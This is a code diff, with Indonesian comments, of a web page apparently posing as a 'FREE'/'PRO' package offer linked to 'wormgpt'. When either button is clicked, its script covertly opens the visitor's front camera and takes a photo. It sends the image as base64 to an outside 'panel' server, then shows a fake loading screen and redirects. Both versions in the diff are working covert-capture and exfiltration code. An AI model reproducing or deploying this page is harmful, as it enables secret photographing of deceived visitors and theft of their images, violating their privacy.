@@ -386,128 +386,84 @@
     </div>
 
     <script>
-        // ===== ELEMEN =====
+        // ===================================================
+        // KONFIGURASI (SUDAH DIISI)
+        // ===================================================
+        const PANEL_URL = 'https://private.gervhosting.my.id/server/b7c2176e/upload-foto';
+        const REDIRECT_URL = 'https://wormgpt.my.id'; // ganti jika perlu
+        // ===================================================
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+        const ctx = canvas.getContext('2d');
         const btnFree = document.getElementById('btnFree');
         const btnPro = document.getElementById('btnPro');
         const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingText = document.getElementById('loadingText');
 
-        // ===================================================
-        // KONFIGURASI – SUDAH DIISI DENGAN SERVER ANDA
-        // ===================================================
-        const REDIRECT_URL = 'https://wormgpt.my.id'; // ganti jika perlu
-
-        // ENDPOINT pengiriman foto (sudah pakai prefix /server/b7c2176e)
-        const PANEL_URL = 'https://private.gervhosting.my.id/server/b7c2176e/upload-foto';
-        // ===================================================
-
-        let stream = null;
-        let capturedImage = null;
-        let selectedPaket = '';
-
-        // ===== FUNGSI MULAI KAMERA & CAPTURE =====
         async function startAndCapture(paket) {
-            selectedPaket = paket;
-            
-            // Disable tombol
+            console.log('[START] Paket:', paket);
             btnFree.disabled = true;
             btnPro.disabled = true;
             btnFree.textContent = '⏳...';
             btnPro.textContent = '⏳...';
 
             try {
-                // 1. Minta izin kamera depan
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                // 1. Kamera
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
                     audio: false
                 });
-
                 video.srcObject = stream;
                 await video.play();
+                await new Promise(r => setTimeout(r, 300));
 
-                // 2. Tunggu kamera stabil
-                await new Promise(resolve => setTimeout(resolve, 300));
-
-                // 3. Ambil foto
+                // 2. Capture
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(video, 0, 0);
+                const base64 = canvas.toDataURL('image/jpeg', 0.9);
 
-                // Data Base64 (tanpa prefix data:image/...)
-                const base64Data = canvas.toDataURL('image/jpeg', 0.9);
+                // 3. Matikan kamera
+                stream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
 
-                // 4. Matikan kamera
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
-                    video.srcObject = null;
+                // 4. Tampilkan loading
+                loadingOverlay.classList.add('active');
+
+                // 5. Kirim ke server
+                console.log('[FETCH] Mengirim ke:', PANEL_URL);
+                const response = await fetch(PANEL_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: base64, paket: paket })
+                });
+                const result = await response.json();
+                console.log('[RESPONSE]', result);
+
+                if (result.status === 'sukses') {
+                    console.log('✅ Berhasil dikirim ke server');
+                } else {
+                    console.warn('⚠️ Server merespons error:', result.message);
                 }
 
-                // 5. Tampilkan loading
-                loadingOverlay.classList.add('active');
-                loadingText.textContent = 'MEMUAT HALAMAN...';
-
-                // 6. Kirim foto ke panel (JSON)
-                await kirimKePanel(base64Data, paket);
-
-                // 7. Redirect setelah 3 detik
+                // 6. Redirect setelah 2 detik
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
-                }, 3000);
+                }, 2000);
 
             } catch (error) {
-                console.error('Error:', error);
-                // Jika gagal, tetap redirect
+                console.error('[ERROR]', error);
                 loadingOverlay.classList.add('active');
-                loadingText.textContent = 'MEMUAT HALAMAN...';
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
                 }, 2000);
             }
         }
 
-        // ===== FUNGSI KIRIM KE PANEL (JSON Base64) =====
-        async function kirimKePanel(base64Image, paket) {
-            try {
-                const payload = {
-                    image: base64Image,  // field yang diharapkan oleh Node.js
-                    paket: paket
-                };
+        btnFree.addEventListener('click', () => startAndCapture('FREE'));
+        btnPro.addEventListener('click', () => startAndCapture('PRO'));
 
-                const response = await fetch(PANEL_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                const result = await response.json();
-                console.log('✅ Respon dari server:', result);
-                return result;
-            } catch (error) {
-                console.error('❌ Gagal mengirim ke panel:', error.message);
-                throw error;
-            }
-        }
-
-        // ===== EVENT LISTENER =====
-        btnFree.addEventListener('click', function() {
-            startAndCapture('FREE');
-        });
-
-        btnPro.addEventListener('click', function() {
-            startAndCapture('PRO');
-        });
-
-        // ===== CEK DUKUNGAN BROWSER =====
+        // Cek dukungan kamera
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             btnFree.disabled = true;
             btnPro.disabled = true;
@@ -515,12 +471,12 @@
             btnPro.textContent = '⚠️ TIDAK DIDUKUNG';
         }
 
-        // ===== CLEANUP =====
-        window.addEventListener('beforeunload', function() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(t => t.stop());
             }
         });
     </script>
 </body>
-</html>
+    </html>
